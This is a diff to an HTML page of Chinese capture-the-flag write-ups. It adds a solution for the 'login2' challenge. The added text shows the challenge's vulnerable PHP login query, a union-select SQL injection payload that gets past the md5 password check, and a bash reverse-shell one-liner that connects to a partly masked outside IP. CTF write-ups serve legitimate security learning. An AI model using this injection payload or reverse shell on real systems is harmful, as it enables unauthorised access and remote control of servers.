@@ -917,7 +917,25 @@ print('The database name is '+flag)
 
 <h2 id="50login2skctf">50.login2(SKCTF)</h2>
 
-<p><a href="https://pengyang.me/2018/08/06/reverse_shell/">https://pengyang.me/2018/08/06/reverse_shell/</a></p>
+<p><strong>tips:</strong></p>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$sql</span><span class="o">=</span><span class="s2">"SELECT username,password FROM admin WHERE username='"</span><span class="o">.</span><span class="nv">$username</span><span class="o">.</span><span class="s2">"'"</span><span class="p">;</span>
+<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$row</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="nv">$row</span><span class="p">[</span><span class="s1">'password'</span><span class="p">]</span><span class="o">===</span><span class="nb">md5</span><span class="p">(</span><span class="nv">$password</span><span class="p">)){</span>
+    <span class="cm">/*这里查询后 $row['password'] 会返回两个值:(1)admin的密码;(2)md5(1)。
+    要想让这里只返回一个值那么就要让用户名不存在
+    */</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>构造 payload:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>username=admin' union select md5(1),md5(1)#&amp;password=1
+</code></pre></div></div>
+
+<p>之后反弹 shell 即可</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>|bash -i &gt;&amp; /dev/tcp/47.XXX.XXX.146/8888 0&gt;&amp;1
+</code></pre></div></div>
 
 <h2 id="51login3skctf">51.login3(SKCTF)</h2>
 
